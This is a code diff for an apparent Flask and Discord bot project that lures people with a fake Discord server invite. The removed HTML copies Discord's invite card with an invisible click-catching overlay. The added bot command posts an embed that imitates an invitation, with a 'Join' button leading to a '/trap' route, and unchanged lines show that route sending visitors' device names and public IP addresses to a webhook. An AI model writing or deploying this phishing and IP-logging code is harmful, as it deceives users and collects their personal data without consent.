@@ -21,83 +21,10 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 # ---------------------
 
-FAKE_JOIN_HTML = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <meta property="og:title" content="BRXXKS">
-    <meta property="og:description" content="BRXXKS Official Community Server!">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #313338; display: flex; justify-content: center; align-items: center; height: 100vh; cursor: pointer; }
-        .embed { background-color: #2b2d31; width: 432px; border-radius: 8px; overflow: hidden; border-left: 4px solid #4f545c; display: flex; flex-direction: column; position: relative; }
-        .banner { width: 100%; height: 120px; object-fit: cover; background: linear-gradient(135deg, #f1c40f, #f39c12); }
-        .content { padding: 16px; position: relative; }
-        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #f1c40f; position: absolute; top: -40px; left: 16px; display: flex; justify-content: center; align-items: center; font-size: 32px; }
-        .title-row { margin-top: 40px; display: flex; align-items: center; gap: 8px; }
-        .title { color: #f2f3f5; font-size: 20px; font-weight: 600; }
-        .badges { display: flex; gap: 4px; }
-        .badge { height: 20px; }
-        .stats { color: #b5bac1; font-size: 14px; margin-top: 8px; display: flex; align-items: center; gap: 12px; }
-        .dot { height: 8px; width: 8px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 4px; }
-        .dot.grey { background-color: #80848e; }
-        .desc { color: #dbdee1; font-size: 14px; margin-top: 16px; line-height: 1.4; }
-        .tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
-        .tag { background-color: #1e1f22; color: #dbdee1; font-size: 12px; padding: 4px 8px; border-radius: 12px; border: 1px solid #3f4147; }
-        .btn { background-color: #248046; color: #fff; border: none; padding: 12px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: 500; transition: 0.2s; margin-top: 20px; text-align: center; text-decoration: none; display: block; }
-        .btn:hover { background-color: #1a6334; }
-        /* Invisible overlay to catch all clicks on the card */
-        .click-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
-    </style>
-</head>
-<body>
-    <div class="embed" onclick="startTrap()">
-        <!-- Invisible overlay to intercept clicks anywhere on the card -->
-        <a href="/trap" class="click-overlay"></a>
-        
-        <div class="banner"></div>
-        <div class="content">
-            <div class="icon">😭</div>
-            <div class="title-row">
-                <div class="title">BRXXKS</div>
-                <div class="badges">
-                    <svg class="badge" viewBox="0 0 24 24" fill="#5865F2"><path d="M12 0L14.59 3.41L18.94 2.85L19.97 7.1L23.79 9.25L22.15 13.32L24 17.24L20.41 19.57L19.04 23.69L14.7 22.84L11.75 25.85L9.12 22.47L4.78 23.42L3.51 19.38L0 16.9L1.84 12.95L0 9L3.51 6.52L4.78 2.48L9.12 3.43L11.75 0H12Z"></path><path fill="#fff" d="M9.99 16.22L6.61 12.84L8.02 11.43L9.99 13.4L15.98 7.41L17.39 8.82L9.99 16.22Z"></path></svg>
-                </div>
-            </div>
-            <div class="stats">
-                <span><span class="dot"></span>7,054 Online</span>
-                <span><span class="dot grey"></span>147,903 Members</span>
-            </div>
-            <div class="stats" style="margin-top: 4px;">Est. Aug 2023</div>
-            <div class="desc">
-                BRXXKS Official Community Server!
-            </div>
-            <div class="tags">
-                <span class="tag">Middle Man</span>
-                <span class="tag">Trading</span>
-                <span class="tag">Steal a Brainrot</span>
-                <span class="tag">Brxxks</span>
-            </div>
-            
-            <a href="/trap" class="btn">Join</a>
-        </div>
-    </div>
-
-    <script>
-        function startTrap() {
-            window.location.href = "/trap";
-        }
-    </script>
-</body>
-</html>
-"""
-
+# Simple redirect trap
 @app.route('/')
 def index():
-    return render_template_string(FAKE_JOIN_HTML)
+    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)
 
 @app.route('/trap')
 def trap():
@@ -118,7 +45,7 @@ def trap():
             "fields": [
                 {"name": "Device Name", "value": f"```{device}```", "inline": False},
                 {"name": "Public IP", "value": f"```{ip}```", "inline": False},
-                {"name": "Method", "value": "```Widget Link Click```", "inline": False}
+                {"name": "Method", "value": "```Invite Click```", "inline": False}
             ]
         }]
     }
@@ -139,9 +66,40 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # This masks the link. They see "Join", but it goes to your Railway trap.
-    trap_link = f"[Join]({RAILWAY_URL})"
-    await ctx.send(f"Come hang out: {trap_link}")
+    # We build a custom embed that looks exactly like an invite
+    embed = {
+        "title": "BRXXKS",
+        "description": "BRXXKS Official Community Server!\n\n🗡️🔥 🛡️🔥",
+        "color": 0x2b2d31,
+        "author": {
+            "name": "You've been invited to join a server",
+            "icon_url": "https://cdn.discordapp.com/emojis/1158760024939425853.gif" 
+        },
+        "fields": [
+            {"name": "🟢 7,054 Online", "value": "⚪ 147,903 Members", "inline": True}
+        ],
+        "image": {
+            "url": "https://cdn.discordapp.com/banners/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=600"
+        },
+        "thumbnail": {
+            "url": "https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=128"
+        },
+        "footer": {
+            "text": "Est. Aug 2023"
+        }
+    }
+    
+    # Send it with a button that looks like the green Join button
+    # Note: Standard Discord bots cannot generate the native server invite button, 
+    # but we can use a Discord UI link button to mimic it perfectly.
+    view = discord.ui.View()
+    view.add_item(discord.ui.Button(
+        style=discord.ButtonStyle.link,
+        label="Join",
+        url=f"{RAILWAY_URL}/trap"
+    ))
+    
+    await ctx.send(embed=discord.Embed.from_dict(embed), view=view)
 
 def run_bot():
     if not BOT_TOKEN:
